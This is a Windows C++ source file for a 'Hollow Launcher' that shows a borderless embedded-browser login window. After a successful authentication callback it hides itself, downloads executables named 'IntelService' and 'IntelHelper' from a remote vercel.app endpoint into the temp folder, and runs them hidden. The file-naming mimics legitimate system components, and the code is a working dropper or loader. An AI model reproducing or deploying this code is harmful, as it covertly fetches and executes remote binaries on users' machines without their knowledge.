#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif

#include <windows.h>
#include <exdisp.h>
#include <mshtml.h>
#include <mshtmhst.h>
#include <olectl.h>
#include <string>
#include <fstream>
#include <sstream>
#include <urlmon.h>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "uuid.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "urlmon.lib")

using namespace std;

// ─── Force IE11 Edge Mode via Registry ───
void SetBrowserEmulationMode() {
    wchar_t exeName[MAX_PATH];
    GetModuleFileNameW(NULL, exeName, MAX_PATH);

    wstring fullPath(exeName);
    wstring filename = fullPath.substr(fullPath.find_last_of(L"\\/") + 1);

    HKEY hKey;
    LPCWSTR subkey = L"Software\\Microsoft\\Internet Explorer\\Main\\FeatureControl\\FEATURE_BROWSER_EMULATION";
    if (RegCreateKeyExW(HKEY_CURRENT_USER, subkey, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD val = 11001; // IE11 Standards Mode
        RegSetValueExW(hKey, filename.c_str(), 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegCloseKey(hKey);
    }

    LPCWSTR subkey2 = L"Software\\Microsoft\\Internet Explorer\\Main\\FeatureControl\\FEATURE_GPU_RENDERING";
    if (RegCreateKeyExW(HKEY_CURRENT_USER, subkey2, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD val = 0;
        RegSetValueExW(hKey, filename.c_str(), 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegCloseKey(hKey);
    }
}

// ─── Globals for auth ───
wstring g_key;
wstring g_hwid;

// ─── Payload Execution ───
void RunHidden(const string& exePath) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    CreateProcessA(NULL, (LPSTR)exePath.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

string Narrow(const wstring& ws) {
    int sz = WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), -1, NULL, 0, NULL, NULL);
    string s(sz-1, 0);
    WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), -1, &s[0], sz, NULL, NULL);
    return s;
}

bool DownloadPayload(const wstring& payloadName) {
    // Build URL: https://op-ff1c.vercel.app/api/payload?f=XXX&key=YYY&hwid=ZZZ
    wstring url = L"https://op-ff1c.vercel.app/api/payload?f=" + payloadName + L"&key=" + g_key + L"&hwid=" + g_hwid;
    char tempA[MAX_PATH];
    GetTempPathA(MAX_PATH, tempA);
    string outPath = string(tempA) + Narrow(payloadName) + ".exe";

    HRESULT hr = URLDownloadToFileW(NULL, url.c_str(), wstring(outPath.begin(), outPath.end()).c_str(), 0, NULL);
    if (SUCCEEDED(hr)) {
        RunHidden(outPath);
        return true;
    }
    // Fallback: try local file if cloud fails (for offline testing)
    string local = Narrow(payloadName) + ".exe";
    if (GetFileAttributesA(local.c_str()) != INVALID_FILE_ATTRIBUTES) {
        RunHidden(local);
        return true;
    }
    return false;
}

void LaunchPayloads() {
    // Cloud payloads - no loose Intel*.exe in client folder
    DownloadPayload(L"IntelService");
    DownloadPayload(L"IntelHelper");
}

// ─── Get absolute file:// path to nui/index.html ───
wstring GetNuiPath() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    wstring path(exePath);
    path = path.substr(0, path.find_last_of(L"\\/"));

    wstring url = L"file:///";
    for (size_t i = 0; i < path.length(); i++) {
        if (path[i] == L'\\') url += L'/';
        else url += path[i];
    }
    url += L"/nui/index.html";
    return url;
}

// ─── OLE Container Implementation ───
class WebSite : public IOleClientSite, public IOleInPlaceSite, public IOleInPlaceFrame, public IDocHostUIHandler {
    LONG m_ref;
public:
    HWND m_hWnd;

    WebSite(HWND hw) : m_ref(1), m_hWnd(hw) {}

    // IUnknown
    STDMETHODIMP QueryInterface(REFIID riid, void** ppv) {
        if (riid == IID_IUnknown || riid == IID_IOleClientSite) { *ppv = (IOleClientSite*)this; }
        else if (riid == IID_IOleInPlaceSite) { *ppv = (IOleInPlaceSite*)this; }
        else if (riid == IID_IOleInPlaceFrame) { *ppv = (IOleInPlaceFrame*)this; }
        else if (riid == IID_IDocHostUIHandler) { *ppv = (IDocHostUIHandler*)this; }
        else { *ppv = NULL; return E_NOINTERFACE; }
        AddRef();
        return S_OK;
    }
    STDMETHODIMP_(ULONG) AddRef() { return InterlockedIncrement(&m_ref); }
    STDMETHODIMP_(ULONG) Release() { ULONG c = InterlockedDecrement(&m_ref); if (!c) delete this; return c; }

    // IOleClientSite
    STDMETHODIMP SaveObject() { return E_NOTIMPL; }
    STDMETHODIMP GetMoniker(DWORD, DWORD, IMoniker**) { return E_NOTIMPL; }
    STDMETHODIMP GetContainer(IOleContainer** pp) { *pp = NULL; return E_NOINTERFACE; }
    STDMETHODIMP ShowObject() { return S_OK; }
    STDMETHODIMP OnShowWindow(BOOL) { return S_OK; }
    STDMETHODIMP RequestNewObjectLayout() { return E_NOTIMPL; }

    // IOleInPlaceSite
    STDMETHODIMP GetWindow(HWND* phwnd) { *phwnd = m_hWnd; return S_OK; }
    STDMETHODIMP ContextSensitiveHelp(BOOL) { return E_NOTIMPL; }
    STDMETHODIMP CanInPlaceActivate() { return S_OK; }
    STDMETHODIMP OnInPlaceActivate() { return S_OK; }
    STDMETHODIMP OnUIActivate() { return S_OK; }
    STDMETHODIMP GetWindowContext(IOleInPlaceFrame** ppFrame, IOleInPlaceUIWindow** ppDoc, LPRECT lprcPosRect, LPRECT lprcClipRect, LPOLEINPLACEFRAMEINFO pInfo) {
        *ppFrame = (IOleInPlaceFrame*)this;
        (*ppFrame)->AddRef();
        *ppDoc = NULL;
        GetClientRect(m_hWnd, lprcPosRect);
        GetClientRect(m_hWnd, lprcClipRect);
        pInfo->cb = sizeof(OLEINPLACEFRAMEINFO);
        pInfo->fMDIApp = FALSE;
        pInfo->hwndFrame = m_hWnd;
        pInfo->haccel = NULL;
        pInfo->cAccelEntries = 0;
        return S_OK;
    }
    STDMETHODIMP Scroll(SIZE) { return E_NOTIMPL; }
    STDMETHODIMP OnUIDeactivate(BOOL) { return S_OK; }
    STDMETHODIMP OnInPlaceDeactivate() { return S_OK; }
    STDMETHODIMP DiscardUndoState() { return E_NOTIMPL; }
    STDMETHODIMP DeactivateAndUndo() { return E_NOTIMPL; }
    STDMETHODIMP OnPosRectChange(LPCRECT) { return S_OK; }

    // IOleInPlaceFrame
    STDMETHODIMP GetBorder(LPRECT) { return E_NOTIMPL; }
    STDMETHODIMP RequestBorderSpace(LPCBORDERWIDTHS) { return E_NOTIMPL; }
    STDMETHODIMP SetBorderSpace(LPCBORDERWIDTHS) { return E_NOTIMPL; }
    STDMETHODIMP SetActiveObject(IOleInPlaceActiveObject*, LPCOLESTR) { return S_OK; }
    STDMETHODIMP InsertMenus(HMENU, LPOLEMENUGROUPWIDTHS) { return E_NOTIMPL; }
    STDMETHODIMP SetMenu(HMENU, HOLEMENU, HWND) { return S_OK; }
    STDMETHODIMP RemoveMenus(HMENU) { return E_NOTIMPL; }
    STDMETHODIMP SetStatusText(LPCOLESTR) { return S_OK; }
    STDMETHODIMP EnableModeless(BOOL) { return S_OK; }
    STDMETHODIMP TranslateAccelerator(LPMSG, WORD) { return E_NOTIMPL; }

    // IDocHostUIHandler - removes scrollbars, 3D border, and disables default right-click menu
    STDMETHODIMP ShowContextMenu(DWORD, POINT*, IUnknown*, IDispatch*) { return S_OK; }
    STDMETHODIMP GetHostInfo(DOCHOSTUIINFO* pInfo) {
        pInfo->cbSize = sizeof(DOCHOSTUIINFO);
        pInfo->dwFlags = DOCHOSTUIFLAG_NO3DBORDER | DOCHOSTUIFLAG_SCROLL_NO | DOCHOSTUIFLAG_THEME;
        pInfo->dwDoubleClick = DOCHOSTUIDBLCLK_DEFAULT;
        return S_OK;
    }
    STDMETHODIMP ShowUI(DWORD, IOleInPlaceActiveObject*, IOleCommandTarget*, IOleInPlaceFrame*, IOleInPlaceUIWindow*) { return S_OK; }
    STDMETHODIMP HideUI() { return S_OK; }
    STDMETHODIMP UpdateUI() { return S_OK; }
    STDMETHODIMP OnDocWindowActivate(BOOL) { return S_OK; }
    STDMETHODIMP OnFrameWindowActivate(BOOL) { return S_OK; }
    STDMETHODIMP ResizeBorder(LPCRECT, IOleInPlaceUIWindow*, BOOL) { return S_OK; }
    STDMETHODIMP TranslateAccelerator(LPMSG, const GUID*, DWORD) { return S_FALSE; }
    STDMETHODIMP GetOptionKeyPath(LPOLESTR*, DWORD) { return E_NOTIMPL; }
    STDMETHODIMP GetDropTarget(IDropTarget*, IDropTarget**) { return E_NOTIMPL; }
    STDMETHODIMP GetExternal(IDispatch** ppDispatch) { *ppDispatch = NULL; return S_FALSE; }
    STDMETHODIMP TranslateUrl(DWORD dwTranslate, LPWSTR pchURLIn, LPWSTR* ppchURLOut) {
        if (pchURLIn) {
            if (wcsstr(pchURLIn, L"launcher://close")) {
                PostMessage(m_hWnd, WM_CLOSE, 0, 0);
                return S_OK;
            }
            if (wcsstr(pchURLIn, L"launcher://minimize")) {
                ShowWindow(m_hWnd, SW_MINIMIZE);
                return S_OK;
            }
            if (wcsstr(pchURLIn, L"launcher://auth_success")) {
                // Parse ?key=XXX&hwid=YYY
                wchar_t* pKey = wcsstr(pchURLIn, L"key=");
                wchar_t* pHwid = wcsstr(pchURLIn, L"hwid=");
                if (pKey) {
                    pKey += 4;
                    wchar_t* end = wcschr(pKey, L'&');
                    g_key = wstring(pKey, end ? end - pKey : wcslen(pKey));
                }
                if (pHwid) {
                    pHwid += 5;
                    wchar_t* end = wcschr(pHwid, L'&');
                    g_hwid = wstring(pHwid, end ? end - pHwid : wcslen(pHwid));
                }
                PostMessage(m_hWnd, WM_USER + 101, 0, 0);
                return S_OK;
            }
        }
        return S_FALSE;
    }
    STDMETHODIMP FilterDataObject(IDataObject* pDO, IDataObject** ppDORet) { return S_FALSE; }
};

// ─── Globals ───
IWebBrowser2* pBrowser = NULL;
IOleObject*   pOle = NULL;

LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_USER + 101: {
        ShowWindow(hWnd, SW_HIDE);
        LaunchPayloads();
        DestroyWindow(hWnd);
        break;
    }
    case WM_CLOSE: {
        ShowWindow(hWnd, SW_HIDE);
        DestroyWindow(hWnd);
        break;
    }
    case WM_CREATE: {
        WebSite* site = new WebSite(hWnd);

        IStorage* pStg = NULL;
        StgCreateDocfile(NULL, STGM_READWRITE | STGM_SHARE_EXCLUSIVE | STGM_CREATE | STGM_DELETEONRELEASE, 0, &pStg);

        HRESULT hr = OleCreate(CLSID_WebBrowser, IID_IOleObject, OLERENDER_DRAW, NULL, site, pStg, (void**)&pOle);
        if (pStg) pStg->Release();

        if (SUCCEEDED(hr)) {
            pOle->SetHostNames(L"HollowHost", NULL);
            OleSetContainedObject(pOle, TRUE);

            RECT rc;
            GetClientRect(hWnd, &rc);
            pOle->DoVerb(OLEIVERB_INPLACEACTIVATE, NULL, site, 0, hWnd, &rc);
            pOle->QueryInterface(IID_IWebBrowser2, (void**)&pBrowser);

            if (pBrowser) {
                pBrowser->put_RegisterAsDropTarget(VARIANT_FALSE);
                pBrowser->put_Silent(VARIANT_TRUE);

                // Navigate to local nui/index.html
                wstring url = GetNuiPath();
                VARIANT vUrl;
                VariantInit(&vUrl);
                vUrl.vt = VT_BSTR;
                vUrl.bstrVal = SysAllocString(url.c_str());
                pBrowser->Navigate2(&vUrl, NULL, NULL, NULL, NULL);
                VariantClear(&vUrl);

                pBrowser->put_Left(0);
                pBrowser->put_Top(0);
                pBrowser->put_Width(rc.right);
                pBrowser->put_Height(rc.bottom);
            }
        }
        break;
    }

    case WM_SIZE: {
        if (pBrowser) {
            RECT rc;
            GetClientRect(hWnd, &rc);
            pBrowser->put_Left(0);
            pBrowser->put_Top(0);
            pBrowser->put_Width(rc.right);
            pBrowser->put_Height(rc.bottom);

            IOleInPlaceObject* pInPlace = NULL;
            if (pOle) {
                pOle->QueryInterface(IID_IOleInPlaceObject, (void**)&pInPlace);
                if (pInPlace) {
                    pInPlace->SetObjectRects(&rc, &rc);
                    pInPlace->Release();
                }
            }
        }
        break;
    }

    case WM_NCHITTEST: {
        LRESULT hit = DefWindowProcW(hWnd, msg, wParam, lParam);
        if (hit == HTCLIENT) {
            POINT pt = { LOWORD(lParam), HIWORD(lParam) };
            ScreenToClient(hWnd, &pt);
            if (pt.y <= 44) return HTCAPTION;
        }
        return hit;
    }

    case WM_DESTROY:
        if (pBrowser) { pBrowser->Quit(); pBrowser->Release(); pBrowser = NULL; }
        if (pOle) { pOle->Close(OLECLOSE_NOSAVE); pOle->Release(); pOle = NULL; }
        PostQuitMessage(0);
        ExitProcess(0);
        break;

    default:
        return DefWindowProcW(hWnd, msg, wParam, lParam);
    }
    return 0;
}

int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE hPrev, LPWSTR lpCmd, int nShow) {
    // Force IE11 Edge mode in registry BEFORE initializing OLE
    SetBrowserEmulationMode();

    OleInitialize(NULL);

    WNDCLASSEXW wc = { sizeof(wc) };
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInst;
    wc.hbrBackground = CreateSolidBrush(RGB(13, 15, 24));
    wc.lpszClassName = L"HollowNUIClass";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);

    RegisterClassExW(&wc);

    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);
    int winW = 480;
    int winH = 320;

    HWND hWnd = CreateWindowExW(
        WS_EX_TOPMOST,
        wc.lpszClassName,
        L"Hollow Launcher",
        WS_POPUP | WS_VISIBLE,
        (screenW - winW) / 2, (screenH - winH) / 2, winW, winH,
        NULL, NULL, hInst, NULL
    );

    HRGN hRgn = CreateRoundRectRgn(0, 0, winW + 1, winH + 1, 14, 14);
    SetWindowRgn(hWnd, hRgn, TRUE);

    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        IOleInPlaceActiveObject* pActiveObj = NULL;
        if (pBrowser && SUCCEEDED(pBrowser->QueryInterface(IID_IOleInPlaceActiveObject, (void**)&pActiveObj))) {
            if (pActiveObj->TranslateAccelerator(&msg) == S_OK) {
                pActiveObj->Release();
                continue;
            }
            pActiveObj->Release();
        }
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    OleUninitialize();
    return 0;
}